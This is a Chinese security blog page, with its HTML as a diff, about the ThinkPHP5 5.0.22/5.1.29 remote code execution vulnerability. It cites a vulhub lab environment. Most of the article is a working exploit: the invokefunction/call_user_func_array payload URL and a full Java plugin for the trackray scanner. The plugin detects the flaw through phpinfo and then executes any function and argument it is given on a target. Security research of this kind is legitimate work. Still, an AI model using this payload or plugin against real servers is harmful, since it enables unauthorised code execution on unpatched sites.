@@ -1,0 +1,340 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="thinkphp5最近新爆出的高危漏洞vulhub已有相关的镜像：https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rcepaylo..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/41.html" />
+<link rel="alternate" type="application/rdf+xml" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/41.html" />
+<link rel="alternate" type="application/atom+xml" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/41.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-41'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-41'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-41'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _nWrpFs = 'b'//'Z'
++//'O'
+'e86'+'b5'//'6'
++//'dRf'
+'90d'+'0a'//'jy'
++'0d8'//'X'
++''///*'VA'*/'VA'
++'3'//'LqM'
++'cdf'//'zqZ'
++'8'//'vn'
++'11c'//'Oo'
++'d02'//'w'
++'b'//'F'
++//'fIb'
+'b99'+//'MAi'
+'MAi'+//'bPo'
+'8'+//'it2'
+'it2'+//'XC'
+'9e', _hSq = [[29,32],[30,33]];
+    
+    for (var i = 0; i < _hSq.length; i ++) {
+        _nWrpFs = _nWrpFs.substring(0, _hSq[i][0]) + _nWrpFs.substring(_hSq[i][1]);
+    }
+
+    return _nWrpFs;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2018-12-11 11:09:28" itemprop="datePublished">2018-12-11 11:09:28</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/41.html"><a href="https://b1ue.cn/category/safe/">安全</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/41.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <p>thinkphp5最近新爆出的高危漏洞</p><p>vulhub已有相关的镜像：<a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce" target="_blank">https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce</a></p><p><img src="/usr/uploads/2018/12/3830738353.png" alt="a" title="a"></p><p>payload:</p><pre><code>/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=方法&amp;vars[1][]=参数
+</code></pre><h2>trackray插件</h2><pre><code>@Plugin(title = &quot;Thinkphp &lt;= 5.1 远程代码执行漏洞&quot; ,link = &quot;https://www.t00ls.net/thread-48931-1-1.html&quot;, author = &quot;blue&quot;)
+@Rule(param = {&quot;target&quot;,&quot;method&quot;,&quot;param&quot;}, type = AbstractPlugin.Type.HTML )
+public class Thinkphp5RCE extends CommonPlugin&lt;String&gt;{
+
+    private static String payload = &quot;/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1&quot;;
+    private String target;
+    private List&lt;String&gt; r = new ArrayList&lt;&gt;();
+    @Override
+    public boolean check(Map&lt;String, Object&gt; param) {
+        target = param.get(&quot;target&quot;).toString();
+        crawlerPage.getRequest().setUrl(target.concat(payload));
+        fetcher.run(crawlerPage);
+        String text = crawlerPage.getResponse().getStatus().getContentString();
+        if (StringUtils.contains(text,&quot;PHP Version&quot;))
+        {
+            r.add(&quot;[+]存在漏洞:&quot;+target.concat(payload));
+            return true;
+        }
+        return false;
+    }
+
+    @Override
+    public String start() {
+        if (param.containsKey(&quot;method&quot;) &amp;&amp; param.containsKey(&quot;param&quot;)){
+            String exp =&quot;/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=&quot;+param.get(&quot;method&quot;)+&quot;&amp;vars[1][]=&quot;+param.get(&quot;param&quot;);
+            crawlerPage.getRequest().setUrl(exp);
+            fetcher.run(crawlerPage);
+            r.add(PageUtils.getContent(crawlerPage));
+        }
+
+        return r.toString();
+    }
+
+
+    public static void main(String[] args)  {
+        final Thinkphp5RCE rce = new Thinkphp5RCE();
+        rce.setParam(new HashMap&lt;String,Object&gt;(){{put(&quot;target&quot;,&quot;http://123.com/&quot;);}});
+        System.out.println(rce.executor().result());
+    }
+
+}
+</code></pre><h2>参考</h2><blockquote><p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce" target="_blank">https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce</a><br><a href="https://bbs.pediy.com/thread-248328.htm" target="_blank">https://bbs.pediy.com/thread-248328.htm</a><br><a href="https://www.t00ls.net/thread-48931-1-1.html" target="_blank">https://www.t00ls.net/thread-48931-1-1.html</a></p></blockquote>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-41" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/41.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/41.html#respond-post-41" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
